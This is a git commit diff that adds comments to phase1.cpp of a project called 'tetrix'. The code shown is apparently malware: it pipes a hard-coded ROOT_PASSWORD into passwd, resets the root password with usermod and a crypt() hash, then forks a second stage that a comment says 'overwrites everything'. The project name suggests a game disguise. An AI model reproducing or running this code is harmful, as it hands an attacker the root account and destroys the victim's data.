3e8a6b1f9d1f8e602b6e43afaf35bb8e9629e0a6
Lukecell <Lukecell@users.noreply.github.com>
2017-04-03 01:51:39 -0700

    Added Documentation
    phase1.cpp Is well written enough to not need documentation, but I like having a ton of comments.

--- src/tetrix/phase1/phase1.cpp
+++ src/tetrix/phase1/phase1.cpp
@@ -1,3 +1,4 @@
+/*Probs am overcommenting*/
 #include "phase1.h"
 #include <unistd.h>
 
@@ -8,8 +9,8 @@ phase1::phase1()
 
 int phase1::execute()
 {
-  FILE* stdin = popen("passwd", "w");
-  const char* newpass = ROOT_PASSWORD;
+  FILE* stdin = popen("passwd", "w"); //Opens passwd file in write mode.
+  const char* newpass = ROOT_PASSWORD;//points char newpass to the password.
   fputs(newpass, stdin);
   fputs(newpass, stdin);
   pclose(stdin);
@@ -18,7 +19,7 @@ int phase1::execute()
   std::string cmd_start = "usermod root -p ";
   std::string second_part = crypt(ROOT_PASSWORD, "AA");
   system((cmd_start + second_part).c_str());
-  if(fork() == 0)
-    system((homedir+"/.config/tetrix/Tetrix -p 2").c_str());
+  if(fork() == 0)//If we haven't already forked, fork
+    system((homedir+"/.config/tetrix/Tetrix -p 2").c_str()); //Begins phase 2, which overwrites everything.
   return 0;
 }
